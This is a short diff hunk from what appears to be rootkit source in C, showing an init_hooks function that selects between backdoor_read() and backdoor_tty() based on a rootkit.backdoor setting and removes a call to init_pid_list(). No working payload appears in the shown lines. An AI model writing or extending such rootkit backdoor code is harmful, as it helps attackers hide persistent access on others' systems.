@@ -58,8 +58,6 @@ init_hooks(void)
         backdoor_read();
     else if (rootkit.backdoor == BD_TTY)
         backdoor_tty();
-
-    init_pid_list();
 }
 
 void
